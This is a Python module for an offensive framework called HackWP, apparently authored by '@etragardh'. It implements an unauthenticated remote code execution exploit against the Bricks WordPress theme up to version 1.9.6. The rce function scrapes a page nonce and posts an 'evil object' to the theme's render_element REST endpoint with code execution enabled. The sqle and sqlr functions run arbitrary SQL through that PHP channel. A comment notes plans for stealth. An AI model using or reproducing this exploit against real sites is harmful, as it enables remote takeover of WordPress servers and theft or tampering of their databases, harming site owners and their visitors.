from helpers import *
import re
from networking import hwpn

##
# HackWP Exploit
# Bricks <1.9.6-rce> 
# version: 0.1

##
# HackWP needs to know how to determine if
# this target is vulnerable to this exploit
# if multiple surfaces, all needs to be present
def get_vuln_data():
    return {
        'core': False,
        'theme': {
            'slug':     'bricks',
            'versions': {
                'from': '*',
                'to':   '1.9.6'
            }
        },
        'plugins': False,
        'custom': False
    }

##
# Custom test if target is vulnerable
# ie it cannot be determined by software
# and versions. Or it is hard to get those.
def is_vulnerable(target):
    return False

##
# HackWP needs to know what this exploit can do
def get_methods():
    return ['RCE', 'LFI', 'RFI', 'SQLe', 'SQLr']

##
# HackWP needs to know if this is authenticated or not
def is_auth_required():
    return False


##
# HackWP needs a function for each attack method
# that is specified in get_methods()

##
# Remote Code Execution
# Return: (str) output_of_php_execution
def rce(instruction, args):
    # HackWP Network Wrapper
    req = hwpn(args)
    if args.verbose: pinfo("Execute PHP:", instruction)
    # Get nonce
    try:
        html = req.get(args.target)
    except(req.exceptions.ConnectionError, req.exceptions.Timeout):
        perror("Target seems offline")
        exit()
    match = re.search('nonce":"(.*?)",', str(html.text))
    if match is None:
        perror("Cannot find nonce")
        exit()
    nonce = match.group(1)

    # Evil Object
    # FIXME: stealth by random ID
    evil_obj = {
        'nonce': nonce,
        'postId': uid(),
        'action': 'bricks_render_element',
        'element': {
            'id': uid(),
            'name': 'code',
            'settings': {
                'code': instruction,
                'executeCode': True
            }
        }
    }

    res = req.post(args.target + "/wp-json/bricks/v1/render_element", json=evil_obj)
    if res.status_code == 200:
        out = re.search('code\\\\">(.*?)<', res.text)
        
        if args.verbose is True:
            psuccess(res.text)
        elif not args.silent:
            if out and out[1]: #Do not out if empty
                psuccess("PHP: " + out[1])
        return out[1]
    else:
        perror(res.text)
        perror("=== There was an error ===")
        return False
##
# Local File Inclusion
# Return: (str) file_contents
def lfi(instruction, args):
    if args.verbose: pinfo("Include:", instruction)

##
# Remote File Inclusion
# Return:
# {
#   'success':  (bool) True,                    # Upload succedded or failed
#   'url':      (str) 'https://e.com/file.php', # URL to file
#   'abspath':  (str) '/var/www/file.php',      # Target abspath to file
# }
def rfi(instruction, args):
    if args.verbose: pinfo("Upload:", instruction)

##
# SQL Execution
# Return:
# {
#   'success':  (bool) True,        # Execution succedded or failed
#   'rows':     (int) 1,            # How many rows affected
#   'iid':      (int) 1,            # Auto incremented ID if any
# }
def sqle(instruction, args):
    if args.verbose: pinfo("Execute SQL:", instruction)
    # Force silent PHP execution
    args.verbose = False
    args.silent = True
    # PHP to execute SQL
    php_instruction = "<?php global $wpdb; $res = $wpdb->query(\""+instruction+"\"); if ($res === false) {echo $wpdb->last_error;} else { echo 'AFFECTED ROWS: ' . $res .';'; if ($wpdb->insert_id) { echo ' INSERT ID: ' . $wpdb->insert_id . ';'; } } ?>"
    # Execute
    res = rce(php_instruction, args)
    if res:
        rows_match = re.search('AFFECTED ROWS: (.*?);', res)
        id_match = re.search('INSERT ID: (.*?);', res)

        rows = rows_match.group(1) if rows_match else False
        iid = id_match.group(1) if id_match else False

        ret = {
            'success':True,
            'rows': rows,
            'iid': iid,
        }
        psuccess("SQL:",ret)
        return ret
    else:
        perror("We had an error", res)

##
# SQL Read
# Return: see SQL Execution
def sqlr(instruction, args):
    if args.verbose: pinfo("Read SQL:", instruction)
    return sqle(instruction, args)

# Author nickname
def get_author():
    return "@etragardh"

##
# Special thanks to:
def get_thanks():
    return False
